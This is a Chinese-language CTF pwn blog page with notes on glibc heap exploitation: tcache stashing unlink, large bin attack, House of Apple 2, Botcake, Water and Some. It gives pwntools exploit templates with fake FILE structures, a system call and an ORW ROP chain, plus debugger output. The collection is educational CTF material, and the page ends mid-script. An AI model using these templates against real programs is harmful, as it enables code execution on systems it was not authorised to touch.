@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='https://ret2ldz.github.io/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/frameworks.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github-style.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/light.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/dark.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/syntax.css' />
+    <title>Heap &amp; House - ldz&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='/images/github-mark.png'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="关于 House of 系列攻击的系统梳理与实战笔记。" />
+<meta name="keywords"
+  content='blog, google analytics' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://ret2ldz.github.io/post/heaphouse/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Heap &amp; House - ldz&#39;s blog" />
+<meta name="twitter:description"
+  content="关于 House of 系列攻击的系统梳理与实战笔记。" />
+<meta name="twitter:site" content="https://ret2ldz.github.io/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="https://ret2ldz.github.io/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Heap &amp; House - ldz&#39;s blog">
+<meta property="og:description"
+  content="关于 House of 系列攻击的系统梳理与实战笔记。" />
+<meta property="og:url" content="https://ret2ldz.github.io/post/heaphouse/" />
+<meta property="og:site_name" content="Heap &amp; House" />
+<meta property="og:image"
+  content="https://ret2ldz.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2024-01-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="https://ret2ldz.github.io/">
+        <img class="octicon" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" id="search-form" action="" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="https://ret2ldz.github.io/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="https://ret2ldz.github.io/">
+                  <img class=" avatar-user"
+                    src="https://ret2ldz.github.io/images/images.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="https://ret2ldz.github.io/">ldz</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="https://ret2ldz.github.io/post/heaphouse/">Heap &amp; House</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Mon, 01 Jan 2024 00:00:00 &#43;0000"
+                    class="no-wrap">
+                    Mon, 01 Jan 2024 00:00:00 &#43;0000</relative-time>
+
+                  
+                  <span class="file-info-divider"></span>
+                  Modified <relative-time datetime="Fri, 02 Jan 2026 00:03:36 &#43;0800"
+                    class="no-wrap">
+                    Fri, 02 Jan 2026 00:03:36 &#43;0800</relative-time>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      3346 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                    
+                    <a class="muted-link mr-3" href="/tags/pwn">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      pwn
+                    </a>
+                    
+                    <a class="muted-link mr-3" href="/tags/heap">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      heap
+                    </a>
+                    
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><h2 id="0x0tcache-stashing-unlink-attack">0x0:Tcache Stashing Unlink Attack</h2>
+<p>在Glibc2.29中也没有对 Small bin的 malloc 做更多保护，利用点如下：</p>
+<p><strong>bin-&gt;bk = bck; bck-&gt;fd = bin;</strong></p>
+<p>下面给出详细实现，即假设有结构：</p>
+<pre tabindex="0"><code>smallbins-&gt;small_chunk1-&gt;small_chunk2
+</code></pre><p>我们在题目有calloc的情况下，tcache对应size未满，smallbins有两个chunk，只需要修改small_chunk1的bk指针为【修改的地址-0x10】即可，另外地，还需要我们伪造fd指针和chunk_size</p>
+<p>例题参考：【BUUOJ-2020 新春红包题-3】</p>
+<p>给一段实现脚本：</p>
+<pre tabindex="0"><code>    for i in range(9):
+        add(i,0x400,b&#39;a&#39;)
+    for i in range(9):
+        delete(i)
+    for i in range(5):
+        add(i+9,0x100,b&#39;b&#39;)
+    for i in range(5):
+        dele(i+9)         
+#上面在处理使tcache的0x100有5个,0x400能放入unsortedbins
+    add(0,0x300,&#39;a&#39;) #将chunk7分割只剩0x100
+    add(0,0x400,&#39;b&#39;) #剩下的0x100进入smallbins
+    add(1,0x400,&#39;a&#39;)  
+    delete(0)
+    add(1,3,&#39;a&#39;) #将chunk0分割只剩0x100
+    add(1,4,&#39;b&#39;) #剩下的chunk进入smallbins
+    pl = &#39;a&#39;*0x300
+    pl += p64(0) + p64(0x101)
+    pl += p64(real_fd)
+    pl += p64(target_addr - 0x10)
+    edit(0,pl)
+</code></pre><h2 id="0x1large-bin-attack">0x1:Large bin Attack</h2>
+<p>我们可以通过改写large bin的bk_nextsize的值来向指定的位置写入一个堆地址，也就是这里存在一个任意地址写堆地址的漏洞，即把chunk2的头地址写入&amp;target</p>
+<pre tabindex="0"><code>add(0,0x520) #chunk0
+add(1,0x508) #padding
+add(2,0x510) #chunk2
+add(3,0x500) #padding
+dele(0) 
+dele(2) #unsorted bin--&gt;chunk2--&gt;chunk0
+show(2) 
+heap_addr = u64(io.recvuntil(b&#39;\n&#39;,drop=True).ljust(8,b&#39;\x00&#39;)) - 0x290
+print(hex(heap_addr))
+add(4,0x510) #large bin--&gt;chunk0
+dele(2) #unsorted bin--&gt;chunk2
+show(0)
+libc_addr = u64(io.recvuntil(b&#39;\n&#39;,drop=True).ljust(8,b&#39;\x00&#39;)) + 0x70017c153000 - 0x70017c337030
+print(hex(libc_addr))
+_IO_wfile_jumps = libc_addr + libc.symbols[&#39;_IO_wfile_jumps&#39;]
+io_list_all = libc_addr + libc.symbols[&#39;_IO_list_all&#39;]
+system_addr = libc_addr + libc.symbols[&#39;system&#39;]
+fake_addr1 = 0x70125399d030 - 0x7012537b9000 + libc_addr
+edit(0,p64(fake_addr1)*2 + p64(heap_addr+0x290) + p64(io_list_all-0x20))
+add(10,0x550) #large bin--&gt;chunk2--&gt;chunk0
+效果是：&amp;io_list_all = *chunk2
+</code></pre><h2 id="0x2house-of-">0x2:House of 🍎②</h2>
+<p><img src="https://ret2ldz.github.io/images/apple.png" alt="">
+这块的东西有点多，但这条链子实在是很厉害。</p>
+<h3 id="调用链如下如需调试直接b-_io_wdoallocbuf即可">调用链如下，如需调试直接b *_IO_wdoallocbuf即可</h3>
+<pre tabindex="0"><code>exit --&gt;&gt; __run_exit_handlers --&gt;&gt; _IO_cleanup --&gt;&gt; _IO_flush_all_lockp 
+--&gt;&gt; _IO_wfile_overflow --&gt;&gt; _IO_wdoallocbuf --&gt;&gt; _IO_WDOALLOCATE
+--&gt;&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)/
+     *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_doallocate)(fp)
+</code></pre><h3 id="no-sandbox">NO SANDBOX</h3>
+<p>直接执行system的板子，适用于无沙箱可泄露heap、libc地址的题目</p>
+<pre tabindex="0"><code>_IO_wfile_jumps = libc_addr + libc.symbols[&#39;_IO_wfile_jumps&#39;]
+io_list_all = libc_addr + libc.symbols[&#39;_IO_list_all&#39;]
+system_addr = libc_addr + libc.symbols[&#39;system&#39;]
+fake_addr1 = 0x70125399d030 - 0x7012537b9000 + libc_addr
+#需要调试修改
+edit(0,p64(fake_addr1)*2 + p64(heap_addr+0x290) + p64(io_list_all-0x20))
+add(10,0x550)
+fake_heap = heap_addr + 0xcd0 #需要调试修改
+edit(1,b&#39;\x00&#39;*0x500 + p64(0x3b68732020))
+fake_IO_FILE=0x18*b&#39;\x00&#39; + p64(1)# _write_ptr
+fake_IO_FILE=fake_IO_FILE.ljust(0xa0-0x10,b&#39;\x00&#39;)+p64(fake_heap+0x100)# _wide_data
+fake_IO_FILE=fake_IO_FILE.ljust(0xd8-x10,b&#39;\x00&#39;)+p64(_IO_wfile_jumps)# _vtable
+fake_IO_FILE=fake_IO_FILE.ljust(0x100-0x10,b&#39;\x00&#39;)
+
+fake_wide_data=&#39;&#39;
+fake_wide_data=b&#39;\x00&#39;*0xe0 + p64(fake_heap+0x200)# _wide_vtable
+fake_wide_data=fake_wide_data.ljust(0x100,b&#39;\x00&#39;)
+
+fake_vtable=&#39;&#39;
+fake_vtable=0x68*b&#39;\x00&#39;+p64(system_addr)
+#fake_vtable=0x68*b&#39;\x00&#39;+p64(one_gadget)
+fake_IO_FILE=fake_IO_FILE+fake_wide_data+fake_vtable
+edit(2,fake_IO_FILE)
+</code></pre><p>我们可以使用gdb&gt;p (*(struct _IO_FILE_plus *)addr)，来快捷查看我们是否正确覆盖了结构体</p>
+<h3 id="orw">ORW</h3>
+<h5 id="遇到开了沙箱的题目需要orw我们需要用setcontext-gadget通过rdi控制rsp去进行栈迁移执行shellcode但是因为现在-setcontext-用的是-rdx-寄存器所以还利用了一个-magic_gadget">遇到开了沙箱的题目需要orw，我们需要用setcontext gadget通过rdi控制rsp去进行栈迁移执行shellcode，但是因为现在 setcontext 用的是 rdx 寄存器，所以还利用了一个 magic_gadget</h5>
+<p>mov rdx, qword ptr [rdi + 8]
+mov qword ptr [rsp], rax
+call qword ptr [rdx + 0x20];</p>
+<h5 id="如何寻找magic-gadget">如何寻找MAGIC GADGET??</h5>
+<p>寻找方法1：在ida内使用ALT+T寻找指令</p>
+<pre tabindex="0"><code>mov     rdx, [rdi+8]
+</code></pre><p>寻找方法2：推荐使用这种排查</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop/apple/2.32-0ubuntu3.2_amd64]
+└─$ ROPgadget --binary ./libc.so.6 --only &#34;mov|call&#34;| grep rdx &gt; 1.txt &amp;&amp; cat 1.txt|grep rdi
+</code></pre><p>将原本system的位置放magic gadget，通过magic gadget设置rdx并且调用setcontext，最后通过setcontext调用rop_chain，因此exp调用链：apple_exp&ndash;&gt;magic&ndash;&gt;setcontext&ndash;&gt;rop_chain</p>
+<pre tabindex="0"><code>list1 = b&#39;\x00&#39;*(0x68-0x10) + p64(heap1-0x10) #heap1 is target to fake_IO_FILE
+list1 = list1.ljust(0xf0,b&#39;\x00&#39;)
+
+fake_IO_FILE=p64(0) + p64(rop)
+fake_IO_FILE+=0x18*b&#39;\x00&#39; + p64(1)# _write_ptr in offset 0x30
+fake_IO_FILE=fake_IO_FILE.ljust(0xa0,b&#39;\x00&#39;)+p64(heap2-0x10)# _wide_data in offset 0xa0,heap2 is target to fake_wide_data
+fake_IO_FILE=fake_IO_FILE.ljust(0xd8,b&#39;\x00&#39;)+p64(_IO_wfile_jumps)# _vtable is offset 0xd8
+fake_IO_FILE=fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
+
+fake_wide_data=&#39;&#39;
+fake_wide_data=b&#39;\x00&#39;*0xe0 + p64(heap3-0x10)# _wide_vtable, heap3 is target to fake_vatble
+fake_wide_data=fake_wide_data.ljust(0x100,b&#39;\x00&#39;)
+
+fake_vtable=&#39;&#39;
+fake_vtable=0x68*b&#39;\x00&#39;+p64(magic)
+setcontext = l + libc.sym.setcontext + 61
+rop_1=b&#39;./flag\x00\x00&#39;+p64(0)*3+p64(setcontext)#setcontext
+rop_1=rop_1.ljust(0xa0,b&#39;\x00&#39;)+p64(rop+0x200)+p64(ret)
+
+orw=p64(pop_rdi_ret)+p64(rop)
+orw+=p64(pop_rsi_ret)+p64(0)
+orw+=p64(pop_rax_ret)+p64(2)
+orw+=p64(syscall_ret)
+    
+orw+=p64(pop_rdi_ret)+p64(3)
+orw+=p64(pop_rsi_ret)+p64(rop+0x300)
+orw+=p64(pop_rdx_r12_ret)+p64(0x45)+p64(0)
+orw+=p64(pop_rax_ret)+p64(0)
+orw+=p64(syscall_ret)
+
+orw+=p64(pop_rdi_ret)+p64(1)
+orw+=p64(pop_rsi_ret)+p64(rop+0x300)
+orw+=p64(pop_rdx_r12_ret)+p64(0x45)+p64(0)
+orw+=p64(pop_rax_ret)+p64(1)
+orw+=p64(syscall_ret)
+
+rop_2=rop_1.ljust(0x200,b&#39;\x00&#39;)+orw
+
+fake_io = list1 + fake_IO_FILE + fake_wide_data + fake_vtable
+</code></pre><h2 id="0x3house-of-">0x3:House of 🤖🎂</h2>
+<p>在 <em><strong>2.29/2.27</strong></em> 高版本之后，glibc 为了防止攻击者简单的 Tcache Double Free，引入了对 Tcache Key 的检查。 当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 key == tcache_key ， 就会遍历这个大小的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</p>
+<p><em><strong>house of botcake的思想是利用堆块的后向合并使我们的利用堆块attacker被前面的堆块在unsorted bin内合并</strong></em></p>
+<pre tabindex="0"><code>for i in range(10):
+	add(i)
+for i in range(7):
+	dele(i) #填满tcache：tcache[7]
+dele(8) #attacker :unsorted bin--&gt;attacker
+dele(7) #helper :unsorted bin--&gt;big_chunk(helper+attacker)
+add(10) #从tcache中取：tcache[6]
+dele(8) #double free success!!!
+</code></pre><h2 id="0x4-house-of-">0x4 House of 🍊</h2>
+<h5 id="适用条件glibc-223--glibc-226程序中无free功能">适用条件：(glibc 2.23 ~ glibc 2.26,程序中无free功能)</h5>
+<p>🍊过期辣，👴不学了</p>
+<h2 id="0x5-house-of-">0x5 House of 💧</h2>
+<p><strong>适用条件：解决无SHOW，存在UAF，且能够申请巨大堆块的题目，作用是泄露地址。</strong></p>
+<p>原理：tcache struct存在两个数组，一个存储指针，一个存储对应指针的堆块数量（一单位2字节）。如果我们申请两个大小相邻的堆块，我们就可以在堆块数量处构造出0x00010001，<strong>如果我们能把这个0x10001作为fake_chunk的size放入unsorted bin，由于unsorted bin会给fd和bk赋值我们就可以给这里面的前面的几个数组指针赋值上libc地址，再次申请即可申请到libc内的堆块</strong>。</p>
+<p><strong><code>我认为还有一个成因是因为tcache直接指向chunk的内容，而unsorted bins指向chunk的头部，我们且看下文就可以明白。</code></strong></p>
+<p>**绕过检查：**而我们需要绕过的就是让这样 fake unsorted chunk 在结束的时候的下个 chunk 的 prev_size 为 0x10000，且 size 的 issue 位为 0，因此我们需要申请大堆块，使prev size合法。</p>
+<pre tabindex="0"><code>pwndbg&gt; x/2gx 0x55929cefb080+0x10000
+0000000000010000 0000000000000020
+</code></pre><p>**利用：**我们试着将两个chunk放入unsorted bin的时候，我们可以在unsorted_start-0x8和unsorted_end-0x8的位置上伪造size=0x20和size=0x30，然后释放其，可以看到 fake chunk 的fd 指针已经指向 unsorted_end，bk 指针已经指向 unsorted_start，因为其size底下正好是0x20、0x30堆块的指针，</p>
+<pre tabindex="0"><code>0x55929cefb070: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb080: 0x00000000      0x00000000      0x00010001      0x00000000//这里是伪造的size
+0x55929cefb090: 0x9cefbcd0      0x00005592      0x9cefbc10      0x00005592//这里是通过释放fake_tcache写入的地址
+</code></pre><p>然后，我们释放三个fake_unsorted堆块，所以不难想到接下来的操作就是令 unsorted_start 的 fd 指针指向 fake unsorted chunk，unsorted_end 的 bk 指针指向 fake unsorted chunk （需要爆破一位）即可完成 unsorted bin 上堆块替换操作。</p>
+<p><img src="https://ret2ldz.github.io/images/unnamed.drawio.png" alt=""></p>
+<p>最困难的部分是：如何在在unsorted_start-0x10和unsorted_end-0x10的位置上伪造size0x20和size0x30，如下</p>
+<pre tabindex="0"><code>for i in range(8):
+    add(0x88)
+play = add(0x20 + 0x30 + 0x500 + (0x90-8)*2) //创建play堆块
+add(0x18)
+dele(play)
+add(0x18) #cut the head of play_chunk
+
+corrupt = add(0x4d0-8) #we need to forge the size of this chunk
+unsort_start = add(0x90-8)
+unsort_mid = add(0x28)
+unsort_end = add(0x90-8)
+overs = add(0x28)
+
+edit(play,p64(0x651),0x18) #let&#39;s free the corrupt,unsort_start,unsort_mid,unsort_end,over again!
+dele(corrupt)
+
+corrupt1 = add(0x4e0-8)
+unsort_start1 = add(0x90-8)
+unsort_mid1 = add(0x28)
+unsort_end1 = add(0x90-8)
+overs1 = add(0x18) #these five chunk have 10 offset compare to the prev fives
+
+add(0x908080-0x8f8da0-0x18)
+fake_bkchunk = add(0x18)
+edit(fake_bkchunk, p64(0x10000) + p64(0x20))
+fake_tcache1 = add(0x3d8)
+fake_tcache2 = add(0x3e8)
+dele(fake_tcache1)
+dele(fake_tcache2)
+
+edit(play,p64(0x31),0x4e8)
+dele(unsort_start)
+edit(play,p64(0x91),0x4f8)
+
+edit(play,p64(0x21),0x5a8)
+dele(unsort_end)
+edit(play,p64(0x91),0x5b8)
+for i in range(7):
+    dele(i)
+dele(unsort_end1)//free 0x20,bk--&gt;fake_chunk
+dele(7)
+dele(unsort_start1)//free 0x30,fd--&gt;fake_chunk
+
+l,h = get_leak()
+edit(unsort_start1,p16((h &lt;&lt; 12) + 0x80)) # start fd points to &#39;fake&#39;
+edit(unsort_end1,p16((h &lt;&lt; 12) + 0x80),8)
+win = add(0x888)
+edit(win,b&#39;A&#39;*32)
+</code></pre><p>成功样例</p>
+<pre tabindex="0"><code>pwndbg&gt; x/100x 0x55929cefb000
+0x55929cefb000: 0x00000000      0x00000000      0x00000291      0x00000000
+0x55929cefb010: 0x00010001      0x00000000      0x00000000      0x00070000
+0x55929cefb020: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb030: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb040: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb050: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb060: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb070: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb080: 0x00000000      0x00000000      0x00010001      0x00000000//这里是伪造的size
+0x55929cefb090: 0x9cefbcd0      0x00005592      0x9cefbc10      0x00005592//这里是通过释放fake_tcache写入的地址
+0x55929cefb0a0: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb0b0: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb0c0: 0x00000000      0x00000000      0x9cefb600      0x00005592
+0x55929cefb0d0: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb0e0: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb0f0: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb100: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb110: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb120: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb130: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb140: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb150: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb160: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb170: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55929cefb180: 0x00000000      0x00000000      0x00000000      0x00000000
+pwndbg&gt; bins
+tcachebins
+0x20 [  1]: 0x55929cefbcd0 ◂— 0
+0x30 [  1]: 0x55929cefbc10 ◂— 0
+0x90 [  7]: 0x55929cefb600 —▸ 0x55929cefb570 —▸ 0x55929cefb4e0 —▸ 0x55929cefb450 —▸ 0x55929cefb3c0 —▸ 0x55929cefb330 —▸ 0x55929cefb2a0 ◂— 0
+0x3e0 [  1]: 0x55929cf0b0a0 ◂— 0
+0x3f0 [  1]: 0x55929cf0b480 ◂— 0
+fastbins
+empty
+unsortedbin//下面是释放real_chunk写入的地址
+all: 0x55929cefbcd0 —▸ 0x55929cefb080 —▸ 0x55929cefbc10 —▸ 0x7f0357e11b20 (main_arena+96) ◂— 0x55929cefbcd0
+smallbins
+empty
+largebins
+empty
+pwndbg&gt; 
+</code></pre><p>那么接下来如何做，当然是把0x90的堆块全申请出来，让fake unsorted bin指向main arena。
+我们惊讶地发现，0x7ff96ec122a0这个地址和stdout的0x7ff96ec125c0只差三位，而且一般stdout后面几位不变（也许不用爆破？）</p>
+<pre tabindex="0"><code>pwndbg&gt; bins
+tcachebins
+0x20 [  1]: 0x7ff96ec122a0 (main_arena+2016) ◂— 0x7ffe9157ce82
+0x30 [  1]: 0x7ff96ec122a0 (main_arena+2016) ◂— 0x7ffe9157ce82
+0x40 [  0]: 0x55e9cee4f080 ◂— ...
+0x50 [  0]: 0x55e9cee4f080 ◂— ...
+0x90 [  1]: 0x55e9cee4fce0 ◂— 0
+0x3e0 [  1]: 0x55e9cee5f0a0 ◂— 0
+0x3f0 [  1]: 0x55e9cee5f480 ◂— 0
+fastbins
+empty
+unsortedbin
+empty
+smallbins
+empty
+largebins
+0x10000-0x17ff0: 0x55e9cee4f080 —▸ 0x7ff96ec122a0 (main_arena+2016) ◂— 0x55e9cee4f080
+pwndbg&gt; p &amp;stdout
+$1 = (FILE **) 0x55e99e563060
+pwndbg&gt; x/10x 0x55e99e563060
+0x55e99e563060: 0x6ec125c0      0x00007ff9      0x00000000      0x00000000
+0x55e99e563070: 0x6ec118e0      0x00007ff9      0x00000000      0x00000000
+0x55e99e563080: 0x6ec124e0      0x00007ff9
+</code></pre><p>** 最后直接衔接stdout leak：p64(0xfbad1800)+p64(0x0)<em>3+&rsquo;\x00&rsquo;</em>*</p>
+<h2 id="house_of_some">HOUSE_OF_SOME</h2>
+<p><img src="https://blog.csome.cc/p/house-of-some/House-of-some.png" alt="img"></p>
+<pre tabindex="0"><code>fake_file_read = flat({
+    0x00: 0, # _flags
+    0x20: 0, # _IO_write_base
+    0x28: 0, # _IO_write_ptr
+    
+    0x38: # _IO_buf_base r
+    0x40: # _IO_buf_end r
+	
+    0x70: 0, # _fileno
+    0x82: b&#34;\x00&#34;, # _vtable_offset
+    0xc0: 2, # _mode
+    0xa0: wide_data的地址, # _wide_data
+    0x68: 下一个调用的fake file地址, # _chain
+    0xd8: _IO_wfile_jumps, # vtable
+}, filler=b&#34;\x00&#34;)
+
+fake_wide_data = flat({
+    0xe0: _IO_file_jumps - 0x48,
+    0x18: 0,
+    0x20: 1,
+    0x30: 0,
+}, filler=b&#34;\x00&#34;)
+
+fake_file_write = flat({
+    0x00: 0x800 | 0x1000, # _flags
+    
+    0x20: 需要泄露的起始地址, # _IO_write_base
+    0x28: 需要泄露的终止地址, # _IO_write_ptr
+
+    0x70: 1, # _fileno
+    0x68: 下一个调用的 fake file 地址, # _chain
+    0xd8: _IO_file_jumps, # vtable
+}, filler=b&#34;\x00&#34;)
+</code></pre><p>这是一条可以直接orw不需要setcontext的链子</p>
+<p><a href="https://github.com/CsomePro/Some-of-House/blob/main/SomeofHouse.py">https://github.com/CsomePro/Some-of-House/blob/main/SomeofHouse.py</a></p>
+<pre tabindex="0"><code>#假设前面已经把4号堆块的头写入io_list_all
+from SomeofHouse import HouseOfSome
+...
+chunk4_head = h + offset #chunk2&amp;4 #io_list_all
+libc = ELF(&#39;...&#39;)
+libc.address = 0xxxxxxxxxx
+...
+edit(1,b&#39;\x00&#39;*0x500 + p64(0x8000 | 0x40 | 0x1000))
